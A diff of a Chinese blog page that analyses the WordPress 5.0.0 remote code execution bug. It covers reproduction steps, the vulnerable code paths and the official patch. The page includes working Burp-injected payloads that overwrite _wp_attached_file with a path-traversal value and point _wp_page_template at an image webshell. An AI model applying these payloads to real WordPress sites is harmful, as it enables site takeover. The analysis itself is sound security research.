@@ -5,18 +5,18 @@
     
     <title>WordPress 5.0.0 RCE 漏洞分析 | Math &amp; Sec ，HACHp1的个人博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="WordPress 5.0.0 RCE 漏洞分析 环境搭建 操作系统：win10 PHP 5.6.28 WP 4.9.4 注意：WP有自动更新会自动修补漏洞，需要在wp-config.php中添加define(&apos;AUTOMATIC_UPDATER_DISABLED&apos;,true);">
+    <meta name="description" content="WordPress 5.0.0 RCE 漏洞分析环境搭建操作系统：win10PHP 5.6.28WP 4.9.4    注意：WP有自动更新会自动修补漏洞，需要在wp-config.php中添加define(&amp;#39;AUTOMATIC_UPDATER_DISABLED&amp;#39;,true);">
 <meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
 <meta property="og:title" content="WordPress 5.0.0 RCE 漏洞分析">
 <meta property="og:url" content="https://hachp1.github.io/posts/Web安全/20190715-wp50.html">
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
-<meta property="og:description" content="WordPress 5.0.0 RCE 漏洞分析 环境搭建 操作系统：win10 PHP 5.6.28 WP 4.9.4 注意：WP有自动更新会自动修补漏洞，需要在wp-config.php中添加define(&apos;AUTOMATIC_UPDATER_DISABLED&apos;,true);">
+<meta property="og:description" content="WordPress 5.0.0 RCE 漏洞分析环境搭建操作系统：win10PHP 5.6.28WP 4.9.4    注意：WP有自动更新会自动修补漏洞，需要在wp-config.php中添加define(&amp;#39;AUTOMATIC_UPDATER_DISABLED&amp;#39;,true);">
 <meta property="og:image" content="http://120.78.185.175/img/thumbnails/planet_red.png">
 <meta property="og:updated_time" content="2019-07-15T09:49:21.415Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WordPress 5.0.0 RCE 漏洞分析">
-<meta name="twitter:description" content="WordPress 5.0.0 RCE 漏洞分析 环境搭建 操作系统：win10 PHP 5.6.28 WP 4.9.4 注意：WP有自动更新会自动修补漏洞，需要在wp-config.php中添加define(&apos;AUTOMATIC_UPDATER_DISABLED&apos;,true);">
+<meta name="twitter:description" content="WordPress 5.0.0 RCE 漏洞分析环境搭建操作系统：win10PHP 5.6.28WP 4.9.4    注意：WP有自动更新会自动修补漏洞，需要在wp-config.php中添加define(&amp;#39;AUTOMATIC_UPDATER_DISABLED&amp;#39;,true);">
 <meta name="twitter:image" content="http://120.78.185.175/img/thumbnails/planet_red.png">
     
 
@@ -267,121 +267,74 @@
         <div class="article-entry" itemprop="articleBody">
         
             
-			<h1 id="wordpress-5.0.0-rce-漏洞分析">WordPress 5.0.0 RCE 漏洞分析</h1>
-<h2 id="环境搭建">环境搭建</h2>
-<p>操作系统：win10<br>
-PHP 5.6.28<br>
-WP 4.9.4</p>
-<p>注意：WP有自动更新会自动修补漏洞，需要在wp-config.php中添加<code>define('AUTOMATIC_UPDATER_DISABLED',true);</code></p>
+			<h1 id="WordPress-5-0-0-RCE-漏洞分析"><a href="#WordPress-5-0-0-RCE-漏洞分析" class="headerlink" title="WordPress 5.0.0 RCE 漏洞分析"></a>WordPress 5.0.0 RCE 漏洞分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>操作系统：win10<br>PHP 5.6.28<br>WP 4.9.4   </p>
+<p>注意：WP有自动更新会自动修补漏洞，需要在wp-config.php中添加<code>define(&#39;AUTOMATIC_UPDATER_DISABLED&#39;,true);</code></p>
 <a id="more"></a>
-<h2 id="漏洞利用过程中的一种代码执行流程最后会有不同系统的利用过程">漏洞利用过程中的一种代码执行流程（最后会有不同系统的利用过程）</h2>
-<p>由于这个漏洞的特殊性，不同的系统的利用链和细节不一样，但是漏洞本身的原理是一致的。一种利用流程为：</p>
-<ol style="list-style-type: decimal">
+<h2 id="漏洞利用过程中的一种代码执行流程（最后会有不同系统的利用过程）"><a href="#漏洞利用过程中的一种代码执行流程（最后会有不同系统的利用过程）" class="headerlink" title="漏洞利用过程中的一种代码执行流程（最后会有不同系统的利用过程）"></a>漏洞利用过程中的一种代码执行流程（最后会有不同系统的利用过程）</h2><p>由于这个漏洞的特殊性，不同的系统的利用链和细节不一样，但是漏洞本身的原理是一致的。一种利用流程为：   </p>
+<ol>
 <li>进入管理后台，媒体文件页面，上传图片马，在更新图片信息处使用burp增加post参数<code>_wp_attached_file</code>并写入目录穿越的路径到数据库</li>
-<li>编辑图片马，在编辑图片处任意编辑后，调用save函数时会读取上一步构造的路径，写入图片到目录穿越的任意文件夹（此处的关键函数为mkdir，有很多细节在后文中会提到）</li>
+<li>编辑图片马，在编辑图片处任意编辑后，调用save函数时会读取上一步构造的路径，写入图片到目录穿越的任意文件夹（此处的关键函数为mkdir，有很多细节在后文中会提到）   </li>
 </ol>
-<p>---前面两步做到了将图片马上传至任意目录---</p>
-<ol start="3" style="list-style-type: decimal">
+<p>—前面两步做到了将图片马上传至任意目录—</p>
+<ol start="3">
 <li>上传一个任意格式的辅助文件（txt等都行），在更新文件信息处增加post参数<code>_wp_page_template</code>并写入模板信息到数据库（将模板信息写为图片马的地址）</li>
 <li>访问辅助文件的对应链接，则执行了图片马（模板会被加载，无视图片马后缀）</li>
 </ol>
-<h2 id="复现">复现</h2>
-<p>首先，上传图片：</p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/uploadimg.png">
-
-</div>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>首先，上传图片：</p>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/uploadimg.png" alt=""></p>
 <p>在编辑图片信息处点击更新：</p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/update.png">
-
-</div>
-<p>使用burp截包，加入payload： <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;meta_input[_wp_attached_file]=2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg</div></pre></td></tr></table></figure></p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/update_c.png">
-
-</div>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/update.png" alt=""></p>
+<p>使用burp截包，加入payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;meta_input[_wp_attached_file]=2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg</div></pre></td></tr></table></figure></p>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/update_c.png" alt=""></p>
 <ul>
 <li>注意：主题的目录要根据现在使用的主题来定，主题的根目录即为该目录，如我在复现时根目录为：twentyseventeen</li>
 </ul>
 <p>可以看到数据库成功写入将要目录穿越的路径：</p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/db1.png">
-
-</div>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/db1.png" alt=""></p>
 <p>然后对刚刚的图片任意编辑并点击保存：</p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/imgedit.png">
-
-</div>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/imgedit.png" alt=""></p>
 <p>可以看到，图片马成功转移到主题目录下：</p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/mvfile.png">
-
-</div>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/mvfile.png" alt=""></p>
 <p>由于此处的图片经过gd或imagick库处理，在真实利用时需要制作出能抵抗处理的图片马，我在此处复现时跳过这步，直接硬写入phpinfo：</p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/oneline.png">
-
-</div>
-<p>到此时，已经将图片马成功移动到主题目录，就等着被包含了。</p>
-<p>---分割线---</p>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/oneline.png" alt=""></p>
+<p>到此时，已经将图片马成功移动到主题目录，就等着被包含了。   </p>
+<p>—分割线—   </p>
 <p>模板包含时，首先上传一个辅助文件：</p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/aid.png">
-
-</div>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/aid.png" alt=""></p>
 <p>点击更新：</p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/update2.png">
-
-</div>
-<p>使用burp截包修改payload： <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;meta_input[_wp_page_template]=1-e1562921273409.jpg</div></pre></td></tr></table></figure></p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/update_c2.png">
-
-</div>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/update2.png" alt=""></p>
+<p>使用burp截包修改payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;meta_input[_wp_page_template]=1-e1562921273409.jpg</div></pre></td></tr></table></figure></p>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/update_c2.png" alt=""></p>
 <p>访问test文件所对应的网页，成功执行代码：</p>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/phpinfo.png">
-
-</div>
-<h2 id="漏洞原理以及修复手段分析">漏洞原理以及修复手段分析</h2>
-<h3 id="路径变量覆盖漏洞">路径变量覆盖漏洞</h3>
-<p>在编辑并更新图片的时候会调用edit_post()函数，wp-admin/includes/post.php：</p>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/phpinfo.png" alt=""></p>
+<h2 id="漏洞原理以及修复手段分析"><a href="#漏洞原理以及修复手段分析" class="headerlink" title="漏洞原理以及修复手段分析"></a>漏洞原理以及修复手段分析</h2><h3 id="路径变量覆盖漏洞"><a href="#路径变量覆盖漏洞" class="headerlink" title="路径变量覆盖漏洞"></a>路径变量覆盖漏洞</h3><p>在编辑并更新图片的时候会调用edit_post()函数，wp-admin/includes/post.php：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit_post</span><span class="params">( $post_data = null )</span> </span>&#123;</div><div class="line">	<span class="keyword">global</span> $wpdb;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( <span class="keyword">empty</span>($post_data) )</div><div class="line">		$post_data = &amp;$_POST;</div><div class="line">...</div><div class="line">$success = wp_update_post( $post_data );</div><div class="line"></div><div class="line">跟进 wp_update_post-&gt;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($postarr[<span class="string">'post_type'</span>] == <span class="string">'attachment'</span>)</div><div class="line">		<span class="keyword">return</span> wp_insert_attachment($postarr);</div><div class="line"></div><div class="line">跟进 wp_insert_attachment-&gt;</div><div class="line"><span class="keyword">return</span> wp_insert_post( $data, $wp_error );</div><div class="line"></div><div class="line"></div><div class="line">跟进 wp_insert_post -&gt;</div><div class="line">	<span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">'meta_input'</span>] ) ) &#123;</div><div class="line">		<span class="keyword">foreach</span> ( $postarr[<span class="string">'meta_input'</span>] <span class="keyword">as</span> $field =&gt; $value ) &#123;</div><div class="line">			update_post_meta( $post_ID, $field, $value );</div><div class="line">		&#125;</div><div class="line">    &#125;</div><div class="line"><span class="comment">//终于到了关键点，可以看到对每个meta_input都更新进数据库，这样一来，攻击者就可以覆盖数据库中的变量了。</span></div></pre></td></tr></table></figure>
-<p>由于WordPress默认的上传路径为<code>wp-content/uploads/years/month</code>，此时，可以利用目录遍历将其覆盖，payload为<code>&amp;meta_input[_wp_attached_file]=2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg</code></p>
-<h3 id="文件任意路径写入">文件任意路径写入</h3>
-<p>在编辑图片并保存时，会调用 /wp-admin/admin-ajax.php ，跟进时，可以发现函数进入了<code>wp_save_image</code>，此时会从数据库中取出被恶意更改的路径： <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">$path = get_attached_file( $post_id ); //查询数据库获取路径，而此时读取到的路径已经是覆盖过的了</div><div class="line">...</div><div class="line">parent::make_image //调用保存图片的函数</div></pre></td></tr></table></figure></p>
-<p>在调用创建图片时，首先调用<code>wp_mkdir_p( dirname( $filename ) )</code>， 整个函数会创建目录；其中，包含创建目录的操作 <code>@mkdir( $target, $dir_perms, true )</code>；但是在windows下，创建文件的操作会失败。</p>
-<p>然后会使用<code>call_user_func_array</code>调用gd或者imagick保存图片文件（在windows下虽然前一步创建失败，但是不存在的目录也能解析，所以可以直接保存图片）<br>
-此时，就成功把图片马写入了模板文件夹。</p>
-<h4 id="构造或的意义wp的图片获取机制">构造<code>?</code>或<code>#</code>的意义，WP的图片获取机制</h4>
-<p>在编辑页面等地方获取图片时，如果此时使用普通的路径<code>./themes/twentyseventeen/1.jpg</code>，WP会不能获取到图片从而不能进行图片编辑和保存的操作。<br>
-在获取图片时，WP首先从数据库中获取路径信息， 由于有的插件根据访问的URL动态生成图片，WP中的图片获取逻辑为：</p>
-<ol style="list-style-type: decimal">
-<li>在本地文件夹中查找。</li>
+<p>由于WordPress默认的上传路径为<code>wp-content/uploads/years/month</code>，此时，可以利用目录遍历将其覆盖，payload为<code>&amp;meta_input[_wp_attached_file]=2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg</code> </p>
+<h3 id="文件任意路径写入"><a href="#文件任意路径写入" class="headerlink" title="文件任意路径写入"></a>文件任意路径写入</h3><p>在编辑图片并保存时，会调用 /wp-admin/admin-ajax.php ，跟进时，可以发现函数进入了<code>wp_save_image</code>，此时会从数据库中取出被恶意更改的路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">$path = get_attached_file( $post_id ); //查询数据库获取路径，而此时读取到的路径已经是覆盖过的了</div><div class="line">...</div><div class="line">parent::make_image //调用保存图片的函数</div></pre></td></tr></table></figure></p>
+<p>在调用创建图片时，首先调用<code>wp_mkdir_p( dirname( $filename ) )</code>， 整个函数会创建目录；其中，包含创建目录的操作 <code>@mkdir( $target, $dir_perms, true )</code>；但是在windows下，创建文件的操作会失败。   </p>
+<p>然后会使用<code>call_user_func_array</code>调用gd或者imagick保存图片文件（在windows下虽然前一步创建失败，但是不存在的目录也能解析，所以可以直接保存图片）<br>此时，就成功把图片马写入了模板文件夹。</p>
+<h4 id="构造-或-的意义，WP的图片获取机制"><a href="#构造-或-的意义，WP的图片获取机制" class="headerlink" title="构造?或#的意义，WP的图片获取机制"></a>构造<code>?</code>或<code>#</code>的意义，WP的图片获取机制</h4><p>在编辑页面等地方获取图片时，如果此时使用普通的路径<code>./themes/twentyseventeen/1.jpg</code>，WP会不能获取到图片从而不能进行图片编辑和保存的操作。<br>在获取图片时，WP首先从数据库中获取路径信息，<br>由于有的插件根据访问的URL动态生成图片，WP中的图片获取逻辑为：</p>
+<ol>
+<li>在本地文件夹中查找。 </li>
 <li>本地未找到（判断为动态图片），使用http协议获取。</li>
 </ol>
-<p>关键函数为： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * Retrieve the path or url of an attachment's attached file.</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * If the attached file is not present on the local filesystem (usually due to replication plugins),</span></div><div class="line"><span class="comment"> * then the url of the file is returned if url fopen is supported.</span></div><div class="line"><span class="comment">**/</span></div><div class="line">_load_image_to_edit_path</div></pre></td></tr></table></figure></p>
+<p>关键函数为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * Retrieve the path or url of an attachment's attached file.</span></div><div class="line"><span class="comment"> *</span></div><div class="line"><span class="comment"> * If the attached file is not present on the local filesystem (usually due to replication plugins),</span></div><div class="line"><span class="comment"> * then the url of the file is returned if url fopen is supported.</span></div><div class="line"><span class="comment">**/</span></div><div class="line">_load_image_to_edit_path</div></pre></td></tr></table></figure></p>
 <ul>
-<li><p>所以，此处构造的payload意义在WP首先使用fopen访问<code>2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg</code>，显然，fopen不能访问该地址；然后再使用http访问<code>http://xxxx....2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg</code>，#后的内容被当做锚点处理，成功访问到图片；从而可以顺利进行图片的编辑操作。</p></li>
-<li><p>在WordPress成功访问到图片后，就会触发保存操作，这样就绕过了图片存在性检验，达到了向任意路径写图片的操作。</p></li>
+<li><p>所以，此处构造的payload意义在WP首先使用fopen访问<code>2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg</code>，显然，fopen不能访问该地址；然后再使用http访问<code>http://xxxx....2019/07/1.jpg#/../../../../themes/twentyseventeen/1.jpg</code>，#后的内容被当做锚点处理，成功访问到图片；从而可以顺利进行图片的编辑操作。</p>
+</li>
+<li><p>在WordPress成功访问到图片后，就会触发保存操作，这样就绕过了图片存在性检验，达到了向任意路径写图片的操作。</p>
+</li>
 </ul>
-<h3 id="模板变量覆盖">模板变量覆盖</h3>
-<p>在数据库中很容易注意到一条数据： <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_wp_page_template 	default</div></pre></td></tr></table></figure></p>
-<p>该变量使用数据库变量覆盖的方法可以类似地进行覆盖，将其覆盖为图片马的名称。但是要注意以下代码(/wp-includes/post.php)，可以看到，如果<code>page_template</code>已经被设置为非<code>default</code>，并攻击者试图继续覆盖时，操作不能成功，也就是说，每个媒体文件只能被设置一次模板文件，所以可以使用辅助上传新文件的方式来写入模板位置： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">'page_template'</span>] ) ) &#123;</div><div class="line">		$post-&gt;page_template = $postarr[<span class="string">'page_template'</span>];</div><div class="line">		$page_templates = wp_get_theme()-&gt;get_page_templates( $post );</div><div class="line">		<span class="keyword">if</span> ( <span class="string">'default'</span> != $postarr[<span class="string">'page_template'</span>] &amp;&amp; ! <span class="keyword">isset</span>( $page_templates[ $postarr[<span class="string">'page_template'</span>] ] ) ) &#123;</div><div class="line">			<span class="keyword">if</span> ( $wp_error ) &#123;</div><div class="line">				<span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'invalid_page_template'</span>, __( <span class="string">'Invalid page template.'</span> ) );</div><div class="line">			&#125;</div><div class="line">			update_post_meta( $post_ID, <span class="string">'_wp_page_template'</span>, <span class="string">'default'</span> );</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			update_post_meta( $post_ID, <span class="string">'_wp_page_template'</span>, $postarr[<span class="string">'page_template'</span>] );</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
-<h3 id="模板文件包含">模板文件包含</h3>
-<p>全局搜索发现了<code>_wp_page_template</code>的引入位置(wp-includes/post-template.php)： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_page_template_slug</span><span class="params">( $post = null )</span> </span>&#123;</div><div class="line">	$post = get_post( $post );</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( ! $post ) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$template = get_post_meta( $post-&gt;ID, <span class="string">'_wp_page_template'</span>, <span class="keyword">true</span> );</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( ! $template || <span class="string">'default'</span> == $template ) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="string">''</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> $template;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>打断点访问一下上传的辅助文件对应的网页，查看一下调用栈，可以看到程序首先通过index主页路由至test，然后经过一系列模板调用操作，最终加载到了数据库中保存的模板文件： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">post-template.php:<span class="number">1683</span>, get_page_template_slug()</div><div class="line">template.php:<span class="number">487</span>, get_single_template()</div><div class="line">template-loader.php:<span class="number">55</span>, <span class="keyword">require_once</span>()</div><div class="line">wp-blog-header.php:<span class="number">19</span>, <span class="keyword">require</span>()</div><div class="line">index.php:<span class="number">17</span>, &#123;main&#125;()</div></pre></td></tr></table></figure></p>
-<p>最后包含了模板文件： <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apply_filters( <span class="string">'template_include'</span>, $template )</div></pre></td></tr></table></figure></p>
-<h3 id="官方补丁">官方补丁</h3>
-<ol style="list-style-type: decimal">
-<li>首先，补丁限制了参数，不允许传入'meta_input', 'file', 'guid'；这样一来，攻击者就没有办法覆盖Post Meta变量了，从而在更改路径和更改模板上都不能利用了。</li>
-<li>然后，post_ID也不直接从POST请求获取，而是读取变量获得：<code>$post_data['post_ID']        = $post_ID;</code>，这样，攻击者就不能控制post_id了。</li>
+<h3 id="模板变量覆盖"><a href="#模板变量覆盖" class="headerlink" title="模板变量覆盖"></a>模板变量覆盖</h3><p>在数据库中很容易注意到一条数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_wp_page_template 	default</div></pre></td></tr></table></figure></p>
+<p>该变量使用数据库变量覆盖的方法可以类似地进行覆盖，将其覆盖为图片马的名称。但是要注意以下代码(/wp-includes/post.php)，可以看到，如果<code>page_template</code>已经被设置为非<code>default</code>，并攻击者试图继续覆盖时，操作不能成功，也就是说，每个媒体文件只能被设置一次模板文件，所以可以使用辅助上传新文件的方式来写入模板位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $postarr[<span class="string">'page_template'</span>] ) ) &#123;</div><div class="line">		$post-&gt;page_template = $postarr[<span class="string">'page_template'</span>];</div><div class="line">		$page_templates = wp_get_theme()-&gt;get_page_templates( $post );</div><div class="line">		<span class="keyword">if</span> ( <span class="string">'default'</span> != $postarr[<span class="string">'page_template'</span>] &amp;&amp; ! <span class="keyword">isset</span>( $page_templates[ $postarr[<span class="string">'page_template'</span>] ] ) ) &#123;</div><div class="line">			<span class="keyword">if</span> ( $wp_error ) &#123;</div><div class="line">				<span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'invalid_page_template'</span>, __( <span class="string">'Invalid page template.'</span> ) );</div><div class="line">			&#125;</div><div class="line">			update_post_meta( $post_ID, <span class="string">'_wp_page_template'</span>, <span class="string">'default'</span> );</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			update_post_meta( $post_ID, <span class="string">'_wp_page_template'</span>, $postarr[<span class="string">'page_template'</span>] );</div><div class="line">		&#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
+<h3 id="模板文件包含"><a href="#模板文件包含" class="headerlink" title="模板文件包含"></a>模板文件包含</h3><p>全局搜索发现了<code>_wp_page_template</code>的引入位置(wp-includes/post-template.php)：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_page_template_slug</span><span class="params">( $post = null )</span> </span>&#123;</div><div class="line">	$post = get_post( $post );</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( ! $post ) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$template = get_post_meta( $post-&gt;ID, <span class="string">'_wp_page_template'</span>, <span class="keyword">true</span> );</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ( ! $template || <span class="string">'default'</span> == $template ) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="string">''</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> $template;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>打断点访问一下上传的辅助文件对应的网页，查看一下调用栈，可以看到程序首先通过index主页路由至test，然后经过一系列模板调用操作，最终加载到了数据库中保存的模板文件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">post-template.php:<span class="number">1683</span>, get_page_template_slug()</div><div class="line">template.php:<span class="number">487</span>, get_single_template()</div><div class="line">template-loader.php:<span class="number">55</span>, <span class="keyword">require_once</span>()</div><div class="line">wp-blog-header.php:<span class="number">19</span>, <span class="keyword">require</span>()</div><div class="line">index.php:<span class="number">17</span>, &#123;main&#125;()</div></pre></td></tr></table></figure></p>
+<p>最后包含了模板文件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apply_filters( <span class="string">'template_include'</span>, $template )</div></pre></td></tr></table></figure></p>
+<h3 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h3><ol>
+<li>首先，补丁限制了参数，不允许传入’meta_input’, ‘file’, ‘guid’；这样一来，攻击者就没有办法覆盖Post Meta变量了，从而在更改路径和更改模板上都不能利用了。</li>
+<li>然后，post_ID也不直接从POST请求获取，而是读取变量获得：<code>$post_data[&#39;post_ID&#39;]        = $post_ID;</code>，这样，攻击者就不能控制post_id了。</li>
 </ol>
-<h2 id="利用思路比较">利用思路比较</h2>
-<p>由于此漏洞涉及到mkdir这个关键的函数，对不同操作系统，其表现不同；所以网上发布的各种分析文章产生了多种利用方法。 mkdir各环境特点概要如下：</p>
+<h2 id="利用思路比较"><a href="#利用思路比较" class="headerlink" title="利用思路比较"></a>利用思路比较</h2><p>由于此漏洞涉及到mkdir这个关键的函数，对不同操作系统，其表现不同；所以网上发布的各种分析文章产生了多种利用方法。<br>mkdir各环境特点概要如下：   </p>
 <ul>
 <li>Linux平台上mkdir<strong>不支持</strong>不存在的目录跳转。（即会检测每一层有效性）</li>
 <li>Windows平台上mkdir<strong>支持</strong>不存在的目录跳转，并且只会创建最后一步的文件夹（即先化简路径，化简后再创建文件夹，不存在的路径不会创建）</li>
@@ -389,49 +342,39 @@ WP 4.9.4</p>
 </ul>
 <p>经过总结，大概有以下几种：</p>
 <p>Windows下：</p>
-<ol style="list-style-type: decimal">
+<ol>
 <li>直接调用crop-image（此时输出的图片为<code>cropped_xxx.jpg</code>）</li>
 <li>windows下直接利用后台管理页面上提供的image-editor的任意一项修改（裁剪、旋转、对称均可），可以无视不存在的目录直接创建在目标目录下（我使用win10、PHP 5.6.28、wp4.9.4环境下成功利用）（此时输出<code>xxx-e1562915044612.jpg</code>）</li>
 </ol>
-<p>Linux下：</p>
-<ol style="list-style-type: decimal">
+<p>Linux下： </p>
+<ol>
 <li>直接调用crop-image</li>
 <li>首先利用image-editor创建文件夹（一次只能创建一层文件夹），再次调用image-editor创建图片马；创建文件夹时的payload:<code>&amp;meta_input[_wp_attached_file]=2019/07/1.jpg#/test.jpg</code>，此时在<code>07</code>创建了<code>1.jpg#</code>文件夹（在Windows下也能成功）：</li>
 </ol>
-<div class="figure">
-<img src="http://120.78.185.175/img/blogimg/wp50/dir_ct.png">
-
-</div>
+<p><img src="http://120.78.185.175/img/blogimg/wp50/dir_ct.png" alt=""></p>
 <p>使用crop-img的payload为：</p>
